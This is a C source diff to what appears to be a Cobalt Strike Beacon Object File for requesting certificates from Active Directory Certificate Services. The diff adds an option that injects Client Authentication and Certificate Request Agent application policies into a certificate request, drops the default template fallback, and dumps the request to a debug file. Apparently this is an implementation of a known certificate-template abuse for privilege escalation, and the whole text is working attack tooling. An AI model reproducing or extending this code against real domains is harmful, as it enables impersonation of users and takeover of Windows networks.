@@ -32,6 +32,15 @@ typedef HRESULT WINAPI (*CoUninitialize_t)(void);
 		BeaconPrintf(CALLBACK_ERROR, "%s failed\n", function); \
 		goto fail; \
 	}
+#define BETTER_CHECK_RETURN_FAIL(x) { \
+	HRESULT hr = x; \
+	if(FAILED(hr)) \
+	{ \
+		BeaconPrintf(CALLBACK_ERROR, "%s failed: 0x%08lx\n", #x, hr); \
+		goto fail; \
+	} \
+}
+
 #define CHECK_RETURN_FAIL( function, result ) \
 	if (FAILED(result)) \
 	{ \
@@ -88,8 +97,11 @@ HRESULT _adcs_request_CreatePrivateKey(BOOL bMachine, IX509PrivateKey ** lppPriv
 
 	CLSID CLSID_CX509PrivateKey = { 0x884e200c, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
 	IID IID_IX509PrivateKey = { 0x728ab30c, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
+	SAFE_RELEASE(*lppPrivateKey);
+	hr = OLE32$CoCreateInstance(&CLSID_CX509PrivateKey, NULL, CLSCTX_INPROC_SERVER, &IID_IX509PrivateKey, (LPVOID *)(lppPrivateKey));
+	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCspInformations)", hr);
 
-		
+
 	// Create an instance of the CLSID_CCspInformations class with the IID_ICspInformations interface
 	SAFE_RELEASE(pCspInformations);
 	hr = OLE32$CoCreateInstance(&CLSID_CCspInformations, NULL, CLSCTX_INPROC_SERVER, &IID_ICspInformations, (LPVOID *)&(pCspInformations));
@@ -97,12 +109,6 @@ HRESULT _adcs_request_CreatePrivateKey(BOOL bMachine, IX509PrivateKey ** lppPriv
 
 	hr = pCspInformations->lpVtbl->AddAvailableCsps(pCspInformations);
 	CHECK_RETURN_FAIL("pCspInformations->lpVtbl->AddAvailableCsps()", hr);
-
-	// Create an instance of the CLSID_CX509PrivateKey class with the IID_IX509PrivateKey interface
-	SAFE_RELEASE(*lppPrivateKey);
-	hr = OLE32$CoCreateInstance(&CLSID_CX509PrivateKey, NULL, CLSCTX_INPROC_SERVER, &IID_IX509PrivateKey, (LPVOID *)(lppPrivateKey));
-	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCspInformations)", hr);
-
 	hr = (*lppPrivateKey)->lpVtbl->put_Length((*lppPrivateKey), PRIVATE_KEY_LENGTH);
 	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_Length()", hr);
 
@@ -134,7 +140,7 @@ fail:
 } // end _adcs_request_CreatePrivateKey
 
 
-HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivateKey, BSTR bstrTemplate, BSTR bstrSubject, BSTR bstrAltName, IX509CertificateRequestPkcs10V3 ** lppCertificateRequestPkcs10V3)
+HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivateKey, BSTR bstrTemplate, BSTR bstrSubject, BSTR bstrAltName, IX509CertificateRequestPkcs10V3 ** lppCertificateRequestPkcs10V3, BOOL addAppPolicy)
 {
 	HRESULT	hr = S_OK;
 	IX500DistinguishedName * pDistinguishedName = NULL;
@@ -145,9 +151,22 @@ HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivat
 	IX509Extensions * pExtensions = NULL;
 	IX509NameValuePair * pAltNameValuePair = NULL;
 	IX509NameValuePairs * pNameValuePairs = NULL;
+	IX509ExtensionTemplateName * pTemplateName = NULL;
+	IX509ExtensionMSApplicationPolicies * pMSAppPolicies = NULL;
+	ICertificatePolicies * certPolicies = NULL;
+	ICertificatePolicy * certPolicy = NULL;
+	ICertificatePolicy * certPolicyReqAgent = NULL;
+	IObjectId * objectId_POLICIES = NULL;
+	IObjectId * objectId_ALLOW_CLIENT = NULL;
+	IObjectId * objectid_CERTAGENT = NULL;
 	BSTR bstrAltNameValuePairName = NULL;
 	BSTR bstrAltNameValuePairValue = NULL;
+	BSTR OID_APP_CERT_POLICY_ALLOW_CLIENT = NULL;
 	WCHAR swzAltNamePairValue[MAX_PATH];
+	LONG index = 0;
+	
+	BSTR OID_APP_CERT_POLICIES = OLEAUT32$SysAllocString(L"1.3.6.1.4.1.311.21.10");
+	BSTR OID_APP_CERTAGENT = OLEAUT32$SysAllocString(L"1.3.6.1.4.1.311.20.2.1");
 	
 	CLSID CLSID_CX509CertificateRequestPkcs10 = { 0x884e2042, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
 	IID IID_IX509CertificateRequestPkcs10V3 = { 0x54EA9942, 0x3D66, 0x4530, {0XB7, 0X6E, 0x7C, 0x91, 0x70, 0xD3, 0xEC, 0x52} };
@@ -168,6 +187,24 @@ HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivat
 
 	CLSID CLSID_CX509NameValuePair = { 0x884e203f, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
 	IID IID_IX509NameValuePair = { 0x728ab33f, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
+
+	CLSID  CLSID_CX509ExtensionMSApplicationPolicies = {0x884e2021,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+	IID IID_IX509ExtensionMSApplicationPolicies = {0x728ab321,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+
+	CLSID CLSID_CCertificatePolicy = {0x884e201e,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+	IID IID_ICertificatePolicy = {0x728ab31e,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+
+	CLSID CLSID_CCertificatePolicies = {0x884e201f,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+	IID IID_ICertificatePolicies = {0x728ab31f,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+
+	CLSID CLSID_CObjectId = {0x884e2000,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+	IID IID_IObjectId = {0x728ab300,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+
+	CLSID CLSID_EKU = {0x884e2010,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+	IID IID_EKU = {0x728ab310,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+
+	CLSID CLSID_TemplateName = {0x884e2011,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
+	IID IID_TemplateName = {0x728ab311,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
 	
 	// Create an instance of the CX509CertificateRequestPkcs10 class with the IX509CertificateRequestPkcs10V2 interface
 	SAFE_RELEASE((*lppCertificateRequestPkcs10V3));
@@ -182,6 +219,15 @@ HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivat
 	SAFE_RELEASE(pDistinguishedName);
 	hr = OLE32$CoCreateInstance(&CLSID_CX500DistinguishedName, NULL, CLSCTX_INPROC_SERVER, &IID_IX500DistinguishedName, (LPVOID *)&(pDistinguishedName));
 	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX500DistinguishedName)", hr);
+
+	hr = OLE32$CoCreateInstance(&CLSID_CObjectId, NULL, CLSCTX_INPROC_SERVER, &IID_IObjectId, (LPVOID *) &objectId_POLICIES);
+	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_OBJECTID)", hr);
+
+		hr = OLE32$CoCreateInstance(&CLSID_CObjectId, NULL, CLSCTX_INPROC_SERVER, &IID_IObjectId, (LPVOID *) &objectId_ALLOW_CLIENT);
+	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_OBJECTID)", hr);
+
+	BETTER_CHECK_RETURN_FAIL(OLE32$CoCreateInstance(&CLSID_CObjectId, NULL, CLSCTX_INPROC_SERVER, &IID_IObjectId, (LPVOID *) &objectid_CERTAGENT));
+	
 
 	// Encode the subject name
 	hr = pDistinguishedName->lpVtbl->Encode(pDistinguishedName, bstrSubject, XCN_CERT_NAME_STR_NONE);
@@ -255,20 +301,78 @@ HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivat
 		hr = pNameValuePairs->lpVtbl->Add(pNameValuePairs, pAltNameValuePair);
 		CHECK_RETURN_FAIL("pNameValuePairs->lpVtbl->Add()", hr);
 	}
-
+	if(addAppPolicy)
+	{
+		hr = objectId_POLICIES->lpVtbl->InitializeFromValue(objectId_POLICIES, OID_APP_CERT_POLICIES);
+		CHECK_RETURN_FAIL(" objectId_ALLOW_CLIENT->lpVtbl->InitializeFromValu", hr);
+		//First Check if the base extension is already there
+		SAFE_RELEASE(pExtensions);
+    	hr = (*lppCertificateRequestPkcs10V3)->lpVtbl->get_X509Extensions((*lppCertificateRequestPkcs10V3), &pExtensions);
+    	CHECK_RETURN_FAIL("(*lppCertificateRequestPkcs10V3)->lpVtbl->get_X509Extensions()", hr);
+		hr = pExtensions->lpVtbl->get_IndexByObjectId(pExtensions, objectId_POLICIES, &index);
+		if(hr == S_OK)
+		{
+			pExtensions->lpVtbl->get_ItemByIndex(pExtensions, index, (IX509Extension**)&pMSAppPolicies);
+			CHECK_RETURN_FAIL("pExtensions->lpVtbl->get_ItemByIndex", hr);
+			internal_printf("Found App Policy at index %d, removing it\n", index);
+			hr = pExtensions->lpVtbl->Remove(pExtensions, index);
+			CHECK_RETURN_FAIL("pExtensions->lpVtbl->Remove", hr);
+		}
+		internal_printf("Now Creating App policy\n");
+		hr = OLE32$CoCreateInstance(&CLSID_CX509ExtensionMSApplicationPolicies, NULL, CLSCTX_INPROC_SERVER, &IID_IX509ExtensionMSApplicationPolicies, (LPVOID *)&pMSAppPolicies);
+		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509ExtensionMSApplicationPolicies)", hr);
+		hr = OLE32$CoCreateInstance(&CLSID_CCertificatePolicies, NULL, CLSCTX_INPROC_SERVER, &IID_ICertificatePolicies, (LPVOID*)&certPolicies);
+		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCertificatePolicies)", hr);
+		hr = OLE32$CoCreateInstance(&CLSID_CCertificatePolicy, NULL, CLSCTX_INPROC_SERVER, &IID_ICertificatePolicy, (LPVOID*) &certPolicy);
+		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCertificatePolicy)", hr);
+		OID_APP_CERT_POLICY_ALLOW_CLIENT = OLEAUT32$SysAllocString(L"1.3.6.1.5.5.7.3.2");
+		hr = objectId_ALLOW_CLIENT->lpVtbl->InitializeFromValue(objectId_ALLOW_CLIENT, OID_APP_CERT_POLICY_ALLOW_CLIENT);
+		CHECK_RETURN_FAIL(" objectId_ALLOW_CLIENT->lpVtbl->InitializeFromValu", hr);
+		SAFE_SYS_FREE(OID_APP_CERT_POLICY_ALLOW_CLIENT);
+		hr = certPolicy->lpVtbl->Initialize(certPolicy, objectId_ALLOW_CLIENT);
+		CHECK_RETURN_FAIL(" certPolicy->lpVtbl->Initialize", hr);
+		hr = certPolicies->lpVtbl->Add(certPolicies, certPolicy);
+		CHECK_RETURN_FAIL(" certPolicies->lpVtbl->Add", hr);
+		//Cert Request
+		hr = OLE32$CoCreateInstance(&CLSID_CCertificatePolicy, NULL, CLSCTX_INPROC_SERVER, &IID_ICertificatePolicy, (LPVOID*) &certPolicyReqAgent);
+		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCertificatePolicy)", hr);
+		hr = objectid_CERTAGENT->lpVtbl->InitializeFromValue(objectid_CERTAGENT, OID_APP_CERTAGENT);
+		CHECK_RETURN_FAIL(" objectid_SMARTCARD->lpVtbl->InitializeFromValu", hr);
+		SAFE_SYS_FREE(OID_APP_CERTAGENT);
+		hr = certPolicyReqAgent->lpVtbl->Initialize(certPolicyReqAgent, objectid_CERTAGENT);
+		CHECK_RETURN_FAIL(" certPolicy->lpVtbl->Initialize", hr);
+		hr = certPolicies->lpVtbl->Add(certPolicies, certPolicyReqAgent);
+		CHECK_RETURN_FAIL(" certPolicies->lpVtbl->Add", hr);
+		hr = pMSAppPolicies->lpVtbl->InitializeEncode(pMSAppPolicies, certPolicies);
+		CHECK_RETURN_FAIL("pMSAppPolicies->lpVtbl->InitializeEncode", hr);
+		SAFE_RELEASE(pExtension);
+		hr = pMSAppPolicies->lpVtbl->QueryInterface( pMSAppPolicies, &IID_IX509Extension, (VOID **)&pExtension);
+		CHECK_RETURN_FAIL("pExtensionAlternativeNames->lpVtbl->QueryInterface()", hr);
+		hr = pExtensions->lpVtbl->Add(pExtensions, pExtension);
+		CHECK_RETURN_FAIL("pExtensions->lpVtbl->Add()", hr);
+	}
 
 	hr = S_OK;
 
 fail:
 
-	
+	//saferelease all the objects
 	SAFE_RELEASE(pNameValuePairs);
 	SAFE_RELEASE(pAltNameValuePair);
 	SAFE_SYS_FREE(bstrAltNameValuePairValue);
 	SAFE_SYS_FREE(bstrAltNameValuePairName);
+	SAFE_SYS_FREE(OID_APP_CERT_POLICY_ALLOW_CLIENT);
+	SAFE_SYS_FREE(OID_APP_CERT_POLICIES);
+	SAFE_SYS_FREE(OID_APP_CERTAGENT);
+	SAFE_RELEASE(objectId_POLICIES);
+	SAFE_RELEASE(objectId_ALLOW_CLIENT);
 	SAFE_RELEASE(pAltNameValuePair);
 	SAFE_RELEASE(pExtensions);
 	SAFE_RELEASE(pExtension);
+	SAFE_RELEASE(pMSAppPolicies);
+	SAFE_RELEASE(certPolicies);
+	SAFE_RELEASE(certPolicy);
+	SAFE_RELEASE(certPolicyReqAgent);
 	SAFE_RELEASE(pExtensionAlternativeNames);
 	SAFE_RELEASE(pAlternativeNames);
 	SAFE_RELEASE(pAlternativeName);
@@ -289,7 +393,9 @@ HRESULT _adcs_request_CreateEnrollment(IX509CertificateRequestPkcs10V3 * pCertif
 	IID IID_IX509Enrollment = { 0x728ab346, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
 
 	IID IID_IX509CertificateRequest = { 0x728ab341, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
-
+	HANDLE hFile = NULL;
+	BSTR value;
+	DWORD len = 0;
 	// Create an instance of the CX509Enrollment class with the IX509Enrollment interface
 	SAFE_RELEASE((*lppEnrollment));
 	hr = OLE32$CoCreateInstance(&CLSID_CX509Enrollment, NULL, CLSCTX_INPROC_SERVER, &IID_IX509Enrollment, (LPVOID *)lppEnrollment);
@@ -302,7 +408,13 @@ HRESULT _adcs_request_CreateEnrollment(IX509CertificateRequestPkcs10V3 * pCertif
 	// Initialize the enrollment object with the certificate request
 	hr = (*lppEnrollment)->lpVtbl->InitializeFromRequest((*lppEnrollment), pCertificateRequest);
 	CHECK_RETURN_FAIL("(*lppEnrollment)->lpVtbl->InitializeFromRequest()", hr);
-
+	
+	pCertificateRequestPkcs10V3->lpVtbl->Encode(pCertificateRequestPkcs10V3);
+	pCertificateRequestPkcs10V3->lpVtbl->get_RawData(pCertificateRequestPkcs10V3, XCN_CRYPT_STRING_BASE64REQUESTHEADER, &value);
+	hFile = KERNEL32$CreateFileA("debug.csr", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	len = OLEAUT32$SysStringLen(value);
+	KERNEL32$WriteFile(hFile, value, len *2, NULL , NULL);
+	KERNEL32$CloseHandle(hFile);
 	hr = S_OK;
 
 fail:
@@ -380,7 +492,7 @@ HRESULT _adcs_request_SubmitEnrollment(IX509Enrollment * pEnrollment, BSTR bstrC
 	if (CR_DISP_ISSUED != pDisposition)
 	{
 		hr = RPC_E_TIMEOUT;
-		internal_printf("[*] CA Response   : Timed out\n");
+		internal_printf("[*] CA Response   : Timed out: %d\n", pDisposition);
 		goto fail;
 	}
 
@@ -399,7 +511,7 @@ fail:
 } // end _adcs_request_SendCertRequestMessage
 
 
-HRESULT adcs_request(LPCWSTR lpswzCA, LPCWSTR lpswzTemplate, LPCWSTR lpswzSubject, LPCWSTR lpswzAltName, BOOL bInstall, BOOL bMachine)
+HRESULT adcs_request(LPCWSTR lpswzCA, LPCWSTR lpswzTemplate, LPCWSTR lpswzSubject, LPCWSTR lpswzAltName, BOOL bInstall, BOOL bMachine, BOOL addAppPolicy)
 {
 	HRESULT	hr = S_OK;
 	BSTR bstrCA = NULL;
@@ -432,12 +544,9 @@ HRESULT adcs_request(LPCWSTR lpswzCA, LPCWSTR lpswzTemplate, LPCWSTR lpswzSubjec
 
 	// Get the template
 	SAFE_SYS_FREE(bstrTemplate);
-	if (bMachine) { bstrTemplate = OLEAUT32$SysAllocString(L"Machine");	}
-	else
-	{
-		if ( IsNullOrEmptyW(lpswzTemplate) ) { bstrTemplate = OLEAUT32$SysAllocString(L"User"); }
-		else { bstrTemplate = OLEAUT32$SysAllocString(lpswzTemplate); }
-	}
+
+	bstrTemplate = OLEAUT32$SysAllocString(lpswzTemplate); 
+	
 
 	// Get the subject name
 	SAFE_SYS_FREE(bstrSubject);
@@ -501,7 +610,7 @@ HRESULT adcs_request(LPCWSTR lpswzCA, LPCWSTR lpswzTemplate, LPCWSTR lpswzSubjec
 	CHECK_RETURN_FALSE("CRYPT32$CryptBinaryToStringW", hr);
 
 	// Create the cert request
-	hr = _adcs_request_CreateCertRequest(bMachine, pPrivateKey, bstrTemplate, bstrSubject, bstrAltName, &pCertificateRequestPkcs10V3);
+	hr = _adcs_request_CreateCertRequest(bMachine, pPrivateKey, bstrTemplate, bstrSubject, bstrAltName, &pCertificateRequestPkcs10V3, addAppPolicy);
 	CHECK_RETURN_FAIL(L"_adcs_request_CreatePrivateKey", hr);
 
 	// Create enrollment
